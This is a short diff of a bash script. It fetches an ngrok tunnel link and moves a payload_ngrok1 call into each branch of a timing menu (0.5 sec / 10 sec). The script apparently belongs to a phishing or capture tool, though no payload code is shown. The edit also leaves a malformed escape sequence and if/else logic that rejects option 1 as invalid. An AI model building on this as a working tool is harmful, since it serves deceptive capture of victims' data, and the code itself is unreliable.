@@ -294,16 +294,19 @@ sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
-payload_ngrok1
 
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m 0.5 sec\e[0m      \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m 10 sec\e[0m\n"
+
+printf "\e\n[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m 0.5 sec\e[0m      \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m 10 sec\e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
+
 if [[ $option == 1 || $option == 01 ]]; then
+payload_ngrok1
 checkfound5
 fi
-if [[ $option == 2 || $option == 02 ]]; then
-checkfound10
 
+if [[ $option == 2 || $option == 02 ]]; then
+payload_ngrok1
+checkfound10
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
